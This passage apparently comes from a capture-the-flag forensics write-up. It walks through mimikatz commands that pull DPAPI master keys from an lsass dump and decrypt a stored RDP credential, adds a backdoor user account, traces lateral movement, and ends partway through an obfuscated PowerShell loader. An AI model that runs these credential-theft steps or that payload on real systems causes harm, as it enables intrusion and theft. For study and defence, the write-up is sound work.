(null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br></pre></td></tr></table></figure>

<p>In this way, we can get the first part of the flag2 –&gt; <code>IDEK&#123;credentia</code></p>
<h3 id="The-second-part-flag2"><a href="#The-second-part-flag2" class="headerlink" title="The second part flag2:"></a>The second part flag2:</h3><p>Tips: I personally think that this part is somewhat misleading. When I communicate with admin on the ticket, admin means that the released traffic is not a necessary condition to solve this problem (although it is also written in Note.txt, but I seem to forget ), but it can help to understand. Personally, I think it is somewhat misleading. However, in my mind-set, this part gave a password, which may be used, so I was stuck on this part for a while. After all, I wondered if there might be some traffic authentication, but I found that it was not. Then I found this The article is about the decryption of credential certificate <a href="https://www.cnblogs.com/Thorndike/p/15325079.html">https://www.cnblogs.com/Thorndike/p/15325079.html</a>, I personally suggest that it can be optimized here to ensure that it can be natural</p>
<p>Find DB79FF0C49C20D542F3690C933AC3046 under <code>C:\Users\IEUser\AppData\Local\Microsoft\Credentials</code> and extract it</p>
<p><img src="https://i.imgur.com/NLKkqCy.png"></p>
<p>Get the GUID of Credentials</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # dpapi::cred /in:DB79FF0C49C20D542F3690C933AC3046</span><br><span class="line">**BLOB**</span><br><span class="line">  dwVersion          : 00000001 - 1</span><br><span class="line">  guidProvider       : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;</span><br><span class="line">  dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">  guidMasterKey      : &#123;9fd81d55-a794-4a77-9fdc-38eff814d2be&#125;</span><br><span class="line">  dwFlags            : 20000000 - 536870912 (system ; )</span><br><span class="line">  dwDescriptionLen   : 00000030 - 48</span><br><span class="line">  szDescription      : Local Credential Data</span><br></pre></td></tr></table></figure>
<p>guidMasterKey –&gt; <code>&#123;9fd81d55-a794-4a77-9fdc-38eff814d2be&#125;</code></p>
<p>Import dmp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # sekurlsa::minidump lsass.dmp</span><br><span class="line">Switch to MINIDUMP : &#x27;lsass.dmp&#x27;</span><br></pre></td></tr></table></figure>

<p>Get masterkey:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 284687 (00000000:0004580f)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : IEUser</span><br><span class="line">Domain            : IEWIN7</span><br><span class="line">Logon Server      : IEWIN7</span><br><span class="line">Logon Time        : 2023/1/8 2:47:38</span><br><span class="line">SID               : S-1-5-21-1610009768-122519599-941061767-1000</span><br><span class="line">         [00000000]</span><br><span class="line">         * GUID      :  &#123;9fd81d55-a794-4a77-9fdc-38eff814d2be&#125;</span><br><span class="line">         * Time      :  2023/1/8 2:47:40</span><br><span class="line">         * MasterKey :  e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb</span><br><span class="line">         * sha1(key) :  de78dc1fb05d27eddaa81f4c2143d43a9a316f1e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 95278 (00000000:0001742e)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : sshd_server</span><br><span class="line">Domain            : IEWIN7</span><br><span class="line">Logon Server      : IEWIN7</span><br><span class="line">Logon Time        : 2023/1/8 2:46:44</span><br><span class="line">SID               : S-1-5-21-1610009768-122519599-941061767-1002</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/1/8 2:46:43</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IEWIN7$</span><br><span class="line">Domain            : WORKGROUP</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/1/8 2:46:43</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 44073 (00000000:0000ac29)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/1/8 2:46:43</span><br><span class="line">SID               :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : IEWIN7$</span><br><span class="line">Domain            : WORKGROUP</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/1/8 2:46:43</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">         [00000000]</span><br><span class="line">         * GUID      :  &#123;79cd7db5-e519-453b-9dc9-ad52372a33d1&#125;</span><br><span class="line">         * Time      :  2023/1/8 2:46:56</span><br><span class="line">         * MasterKey :  50f4acc588c6f7aab0902c5e638c46b3671b150abf8d55e5a5ae47c50062607e3ec383b1973bae8d9d53815e59bfe012c594a232f2788562e461c9620ae74c31</span><br><span class="line">         * sha1(key) :  913dba47ec0e0122494b963271da1c8a5757ef6c</span><br><span class="line">         [00000001]</span><br><span class="line">         * GUID      :  &#123;f22e410f-f947-4e08-8f2a-8f65df603f8d&#125;</span><br><span class="line">         * Time      :  2023/1/8 2:46:43</span><br><span class="line">         * MasterKey :  19c05880b67d50f8231cd8009836e3cdc55610e4877f8b976abd5ca15600d0e759934324c6204b56f02527039e7fc52a1dfb5296d3381aaa7c3eb610dffa32fa</span><br><span class="line">         * sha1(key) :  b859b2b52e7e49cf5c70069745c88853c4b23487</span><br></pre></td></tr></table></figure>

<p>MasterKey –&gt;  <code>e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb</code></p>
<p>decrypt:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # dpapi::cred /in:DB79FF0C49C20D542F3690C933AC3046 /masterkey:e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb</span><br><span class="line">**BLOB**</span><br><span class="line">  dwVersion          : 00000001 - 1</span><br><span class="line">  guidProvider       : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;</span><br><span class="line">  dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">  guidMasterKey      : &#123;9fd81d55-a794-4a77-9fdc-38eff814d2be&#125;</span><br><span class="line">  dwFlags            : 20000000 - 536870912 (system ; )</span><br><span class="line">  dwDescriptionLen   : 00000030 - 48</span><br><span class="line">  szDescription      : Local Credential Data</span><br><span class="line"></span><br><span class="line">  algCrypt           : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">  dwAlgCryptLen      : 00000100 - 256</span><br><span class="line">  dwSaltLen          : 00000020 - 32</span><br><span class="line">  pbSalt             : d1ae596e635002339b7dcce09f5ff6acc53b7bc9395d162ea93c328f98c31f53</span><br><span class="line">  dwHmacKeyLen       : 00000000 - 0</span><br><span class="line">  pbHmackKey         :</span><br><span class="line">  algHash            : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">  dwAlgHashLen       : 00000200 - 512</span><br><span class="line">  dwHmac2KeyLen      : 00000020 - 32</span><br><span class="line">  pbHmack2Key        : 92e17a569f3c13606b0893c758fb9e81c1a06d2015dcebcf15107900a963ad0e</span><br><span class="line">  dwDataLen          : 000000f0 - 240</span><br><span class="line">  pbData             : 1413918e9f648cfb258ed6bd270360ab66d1d5e9c16580866a899184a71feb58219ade909f09184d6796ef0bd91e5091be80e76f48aa4cf7f29bfda7bb63d74e62698283cf2b6faf8ad44ddc296341acd8e61fe8cd12f2e33e8ae6bd20b328772b0816b881f21f877d8a1506fcbb06ce2b85688244b05911e97fa3f9068af0d17de3f6813cc937be00830986e93e2a467de46f11260746fe42ea38f6a20d79f1696de59efe69ead3bcb97a7ce85d45a6c78ec77bfe42b1a891175a519d37286ab3cf8a58955fdc5561f7543e6754953cce0576f58819433a47c930a31c9ad4dccf7376b1be3b00b7111ba649876b20d1</span><br><span class="line">  dwSignLen          : 00000040 - 64</span><br><span class="line">  pbSign             : 7f41a9469ad24a5e572c48ab6f0f1919f0a53e52963ad88676fb730aa9d6ba7e4045e5b3e45c9a33b56ca720c82d202cabd8085cabc5f3834e537ff79a987f22</span><br><span class="line"></span><br><span class="line">Decrypting Credential:</span><br><span class="line"> * volatile cache: GUID:&#123;9fd81d55-a794-4a77-9fdc-38eff814d2be&#125;;KeyHash:de78dc1fb05d27eddaa81f4c2143d43a9a316f1e;Key:available</span><br><span class="line"> * masterkey     : e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb</span><br><span class="line">**CREDENTIAL**</span><br><span class="line">  credFlags      : 00000030 - 48</span><br><span class="line">  credSize       : 000000ea - 234</span><br><span class="line">  credUnk0       : 00000000 - 0</span><br><span class="line"></span><br><span class="line">  Type           : 00000002 - 2 - domain_password</span><br><span class="line">  Flags          : 00000000 - 0</span><br><span class="line">  LastWritten    : 2023/1/6 15:55:10</span><br><span class="line">  unkFlagsOrSize : 00000040 - 64</span><br><span class="line">  Persist        : 00000002 - 2 - local_machine</span><br><span class="line">  AttributeCount : 00000000 - 0</span><br><span class="line">  unk0           : 00000000 - 0</span><br><span class="line">  unk1           : 00000000 - 0</span><br><span class="line">  TargetName     : Domain:target=TERMSRV/192.168.209.134</span><br><span class="line">  UnkData        : (null)</span><br><span class="line">  Comment        : (null)</span><br><span class="line">  TargetAlias    : (null)</span><br><span class="line">  UserName       : administrator</span><br><span class="line">  CredentialBlob : l_4C3S5_f0R_1@73rAl_mOv3M3n7&#125;</span><br><span class="line">  Attributes     : 0</span><br></pre></td></tr></table></figure>

<p>Get the second part of the second flag –&gt; <code>l_4C3S5_f0R_1@73rAl_mOv3M3n7&#125;</code></p>
<p>Splice the two to get flag2 –&gt; <code>idek&#123;crEDential_4C3S5_f0R_1@73rAl_mOv3M3n7&#125;</code></p>
<h2 id="HiddenGem-Mixtape-3-The-Ultimate-Goal"><a href="#HiddenGem-Mixtape-3-The-Ultimate-Goal" class="headerlink" title="HiddenGem Mixtape 3: The Ultimate Goal"></a>HiddenGem Mixtape 3: The Ultimate Goal</h2><h3 id="Add-user"><a href="#Add-user" class="headerlink" title="Add user:"></a>Add user:</h3><p>Run <code>net user netadmin S3cr3tpa5sw0rD /add</code></p>
<p><img src="https://i.imgur.com/6FqvhTR.png"></p>
<p>However, this does not seem to be used later as a related operation, but this part is more like an RDP prompt. Of course, you can also find RDP through the traffic part</p>
<h3 id="RDP"><a href="#RDP" class="headerlink" title="RDP:"></a>RDP:</h3><p>In the traffic packet, we can know that when the attacker steals relevant credentials through mimikatz, he logs in to <code>192.168.209.147</code> through rdp and then logs in to <code>192.168.209.134</code> from <code>192.168.209.147</code>. The relevant traffic is as follows:</p>
<p><img src="https://i.imgur.com/JUoJXK7.png"></p>
<p><img src="https://i.imgur.com/k0ql290.png"></p>
<p>There are also some relevant information in the <code>Security.evtx</code> log</p>
<p><img src="https://i.imgur.com/YQ1rtX3.png"></p>
<p><img src="https://i.imgur.com/dI1fUeH.png"></p>
<h3 id="BMC"><a href="#BMC" class="headerlink" title="BMC:"></a>BMC:</h3><p>Since the existence of RDP is known, at the same time, it can be associated with the RDP cache bitmap. After extracting these files, <code>C:\Users\IEUser\AppData\Local\Microsoft\Terminal Server Client\Cache\</code> can use bmc-tools to get the relevant data <a href="https://github.com/ANSSI-FR/bmc-tools">https://github.com/ANSSI-FR/bmc-tools</a></p>
<p><img src="https://i.imgur.com/JY59ZGq.png"></p>
<p>Then do the jigsaw puzzle to get</p>
<p><img src="https://i.imgur.com/txXf7vq.png"></p>
<p><img src="https://i.imgur.com/lBbRcuq.png"></p>
<p>It is not difficult to speculate that it uses the BitsTranser module to download the dns-stealing file and load it</p>
<p><a href="https://learn.microsoft.com/en-us/powershell/module/bitstransfer/start-bitstransfer?view=windowsserver2022-ps">https://learn.microsoft.com/en-us/powershell/module/bitstransfer/start-bitstransfer?view=windowsserver2022-ps</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 bmc-tools.py -s Cache0000.bin -d ./00/</span><br><span class="line">python3 bmc-tools.py -s Cache0001.bin -d ./01/</span><br><span class="line">python3 bmc-tools.py -s Cache0002.bin -d ./02/</span><br></pre></td></tr></table></figure>

<p>Next step to analyze the obfuscated powershell script</p>
<h3 id="Powershell-2nd"><a href="#Powershell-2nd" class="headerlink" title="Powershell 2nd:"></a>Powershell 2nd:</h3><p><a href="https://gist.github.com/bquanman/cb6a4b2420d9f3d2f27287dcb46661d6">https://gist.github.com/bquanman/cb6a4b2420d9f3d2f27287dcb46661d6</a></p>
<p>After decrypting once, we get</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(  &#x27;)(@&#x27;|  &amp;(&#x27;%&#x27;)&#123;  $&#123;;@!&#125;=  +  $()&#125;  &#123;  $&#123;;+&#125;  =$&#123;;@!&#125;&#125;&#123;  $&#123;~=&#125;  =  ++$&#123;;@!&#125;  &#125;  &#123;$&#123;@[&#125;=(  $&#123;;@!&#125;  =$&#123;;@!&#125;  +  $&#123;~=&#125;)&#125;  &#123;$&#123;~&#125;=  (  $&#123;;@!&#125;=$&#123;;@!&#125;+  $&#123;~=&#125;  )  &#125;&#123;$&#123;![/&#125;  =  (  $&#123;;@!&#125;=$&#123;;@!&#125;  +$&#123;~=&#125;)  &#125;  &#123;  $&#123;$] &#125;=  ($&#123;;@!&#125;  =$&#123;;@!&#125;+$&#123;~=&#125;  )  &#125;  &#123;  $&#123;]&#125;  =($&#123;;@!&#125;  =  $&#123;;@!&#125;  +  $&#123;~=&#125;)  &#125;&#123;  $&#123;](&#125;=  (  $&#123;;@!&#125;=$&#123;;@!&#125;+$&#123;~=&#125;  )&#125;  &#123;  $&#123;&#x27;$[&#125;=  (  $&#123;;@!&#125;=$&#123;;@!&#125;+$&#123;~=&#125;  )&#125;&#123;$&#123;@$/&#125;=(  $&#123;;@!&#125;=  $&#123;;@!&#125;+$&#123;~=&#125;)  &#125;  &#123;  $&#123;)&#125;  =&quot;[&quot;  +  &quot;$(@&#123;&#125;  )&quot;[  $&#123;](&#125;  ]  +  &quot;$(@&#123;  &#125;)&quot;[  &quot;$&#123;~=&#125;$&#123;@$/&#125;&quot;  ]+&quot;$(  @&#123;&#125;)&quot;[  &quot;$&#123;@[&#125;$&#123;;+&#125;&quot;]  +  &quot;$?&quot;[  $&#123;~=&#125;]  +&quot;]&quot;&#125;&#123;  $&#123;;@!&#125;=&quot;&quot;.(&quot;$(  @&#123;  &#125;)&quot;[&quot;$&#123;~=&#125;$&#123;![/&#125;&quot;]  +  &quot;$(  @&#123;&#125;)&quot;[  &quot;$&#123;~=&#125;$&#123;]&#125;&quot;  ]  +  &quot;$(@&#123;  &#125;)  &quot;[  $&#123;;+&#125;  ]  +  &quot;$(  @&#123;&#125;  )  &quot;[$&#123;![/&#125;]  +&quot;$?&quot;[$&#123;~=&#125;  ]  +&quot;$(@&#123;  &#125;)&quot;[$&#123;~&#125;  ])  &#125;&#123;$&#123;;@!&#125;=  &quot;$(  @&#123;&#125;)  &quot;[  &quot;$&#123;~=&#125;$&#123;![/&#125;&quot;  ]+&quot;$(@&#123;&#125;)  &quot;[$&#123;![/&#125;  ]+&quot;$&#123;;@!&#125;&quot;[  &quot;$&#123;@[&#125;$&#123;](&#125;&quot;  ]  &#125;  )  ;&quot;$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;](&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;&#x27;$[&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;](&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;](&#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;&#x27;$[&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;](&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;![/&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;](&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;]&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;](&#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;](&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;&#x27;$[&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;](&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;](&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;](&#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;](&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  